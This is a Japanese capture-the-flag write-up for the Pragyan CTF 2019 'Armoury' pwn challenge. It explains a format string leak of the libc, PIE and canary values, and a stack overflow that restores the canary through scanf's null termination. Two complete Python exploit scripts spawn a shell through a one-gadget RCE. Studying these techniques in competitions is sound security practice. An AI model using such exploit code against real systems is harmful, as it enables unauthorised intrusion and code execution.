# [pwn 400pts] Armoury - Pragyan CTF 2019
64ビットバイナリで，PIEやSSPも有効です．
```
$ checksec armoury 
[*] '/home/ptr/writeups/2019/PragyanCTF_2019/armoury/armoury'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
IDAで解析しましょう．

scanfでライフルの名前を取得し，リストに存在すればそのファイルを表示します．
ただし，scanfした後にprintfでそのまま出力しているのでFSBが存在します．
したがって，PIEやASLRは回避できそうです．
また，この処理は2回だけ実行できるので，FSBも2回実行できます．

ループを抜けると最後にフィードバックを書くことができますが，ここでスタックオーバーフローが存在します．
ということで，Format String ExploitとStack Overflowを利用してシェルを取りましょう．

まずはlibc baseとproc baseを取得するのですが，ついでにStack Canaryの値も取得します．
スタック上には`main`のアドレスと`__libc_start_main`へのリターンアドレスがあったので，これを使います．
なお，`__libc_start_main`のリターンアドレスをlibc databaseで調べるとlibcのバージョンが分かりました．

FSBは簡単にアドレスをリークできるので便利ですね．
```python
from ptrlib import *

#sock = Socket("159.89.166.12", 16000)
sock = Socket("localhost", 16000)
elf = ELF("./armoury")

# leak proc_base and libc_base
sock.recvuntil("info:\n")
sock.sendline("%15$p.%19$p.%13$p.")
sock.recvuntil("-\n")
addrlist = sock.recvline().split(b".")
addr_libc_start_main = int(addrlist[0], 16)
addr_main = int(addrlist[1], 16)
canary = int(addrlist[2], 16)
proc_base = addr_main - elf.symbol('main')
libc_base = addr_libc_start_main - 0x021b97
print("[+] libc_base = " + hex(libc_base))
print("[+] proc_base = " + hex(proc_base))
print("[+] canary = " + hex(canary))
```


さて，Stack Overflowでリターンアドレスを書き換えるにはcanaryを壊さない必要があるのですが，scanfを利用しているためNULL文字が使えません．
canaryは先頭に必ずNULL文字が入っているため，このままではリターンアドレスを変更できません．

競技中にはここでしばらく悩んだのですが，FSBの方のscanfを利用できます．
FSBの方の（ライフルの名前を取得する）scanfにもオーバーフロー脆弱性があるので，2回目のscanfでcanaryの先頭のNULL文字を破壊してリターンアドレスを書き換えます．
そしてフィードバックの方のscanfでcanaryを正しい値に戻します．
scanfは終端をNULL文字で埋めてくれるので，先程破壊したcanaryの最初のNULLを元に戻すことができます．

あとはone gadget rceにジャンプすればシェルが取得できます．
```python
from ptrlib import *

#sock = Socket("159.89.166.12", 16000)
sock = Socket("localhost", 16000)
elf = ELF("./armoury")

# leak proc_base and libc_base
sock.recvuntil("info:\n")
sock.sendline("%15$p.%19$p.%13$p.")
sock.recvuntil("-\n")
addrlist = sock.recvline().split(b".")
addr_libc_start_main = int(addrlist[0], 16)
addr_main = int(addrlist[1], 16)
canary = int(addrlist[2], 16)
proc_base = addr_main - elf.symbol('main')
libc_base = addr_libc_start_main - 0x021b97
print("[+] libc_base = " + hex(libc_base))
print("[+] proc_base = " + hex(proc_base))
print("[+] canary = " + hex(canary))

# calc something...
addr_system = libc_base + 0x04f440
addr_binsh = libc_base + 0x1b3e9a
addr_rce = libc_base + 0x4f2c5 # one gadget rce

# overwrite ret addr
payload = "A" * 0x27
payload += p64(canary).replace('\x00', 'A') # temp canary
payload += "A" * 8
payload += p64(addr_rce)
sock.recvuntil("info:\n")
sock.sendline(payload)

# set correct canary
payload = "A" * 0x18
sock.recvuntil("feedback:\n")
sock.sendline(payload)

sock.interactive()
```

# 感想
競技中も解いてて面白かった記憶があります．
scanfの性質を上手く利用した問題ですね．